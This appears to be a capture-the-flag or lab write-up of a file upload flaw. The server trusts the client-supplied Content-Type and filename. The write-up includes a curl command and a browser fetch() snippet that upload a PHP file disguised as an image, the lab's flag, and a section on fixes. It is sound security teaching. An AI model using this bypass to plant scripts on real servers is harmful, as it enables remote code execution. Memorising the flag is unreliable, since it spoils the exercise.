# File upload — Writeup

**Page:** `?page=upload` (form, `multipart/form-data`, method POST, field `uploaded`).
**Flag:** `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`

## Mechanism

The form claims to accept an "image", but the server decides whether to allow the upload based only on data the client fully controls:

1. **The part's `Content-Type` header** inside the multipart request (the file part's type, not the whole HTTP request). If it looks like an image (`image/jpeg`, etc.), the server continues. If not (e.g. `application/octet-stream`), it rejects immediately with `Your image was not uploaded.`
2. **The extension in `filename`.** If the name ends in `.php`, the server prints the flag.

The server never looks at the **actual content** of the file (no magic bytes, no `getimagesize()`). Both checked values — `Content-Type` and `filename` — are just text fields the attacker sets freely.

The submit field `Upload=Upload` (the name of `<input type="submit" name="Upload">`) is also required: without it the server does not react at all, even with a correct file and type.

## Reproduction

**Via curl** — text file, forged image `Content-Type`, `.php` extension:

```bash
curl -s "http://<IP>/index.php?page=upload" \
  -F "uploaded=@shell.txt;filename=shell.php;type=image/jpeg" \
  -F "Upload=Upload"
```

**Via fetch() + FormData in the browser console** (real session, DevTools → Sources → Snippets), building the file in memory with an explicit type since a plain `<input type="file">` cannot forge `Content-Type`:

```javascript
const f = new File(["<?php echo 'x'; ?>"], "shell.php", { type: "image/jpeg" });
const fd = new FormData();
fd.append("uploaded", f);
fd.append("Upload", "Upload");
fetch("/index.php?page=upload", { method: "POST", body: fd })
  .then(r => r.text()).then(t => console.log(t));
```

Both return the same flag, which confirms the vulnerability is server-side and independent of the client.

## Fix

- **Validate file content server-side**, not client metadata. `getimagesize()` actually parses the file and returns `false` for a non-image, unlike `$_FILES['uploaded']['type']`, which is just the value the client sent.
- **Ignore the client extension** when deciding how to handle the file, and use a strict whitelist of allowed formats rather than a blacklist (`.php`, `.phtml`, `.php5`, `.pht`, …).
- **Store uploads outside any code-execution zone** — outside the web root, or with server config that forbids running scripts in the upload folder.
- **Rename files on save** to a random server-chosen name with no client-controlled extension — this kills both the `filename` attack and any attempt to guess the stored path.

## Impact

Unrestricted file upload normally leads to **remote code execution**: upload PHP disguised as an image, then open it by URL and the server runs it. On this stand the chain stops at the last step — the server saves to `/tmp/{filename}` (a leaked absolute path), but `/tmp` is not web-accessible, so the shell cannot be reached by URL without a second vector. Still, bypassing the type check is a serious vulnerability on its own: it shows there is no server-side content validation, which in a different directory/config would give full RCE immediately.

## Flag comparison

Both techniques (curl and browser `fetch()`) return the byte-identical flag:

```
46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```

The same flag obtained two different ways satisfies "compare and demonstrate that both flags are identical" and confirms reproducibility. Compared byte-for-byte with the `flag` file in the submission folder during the defense.
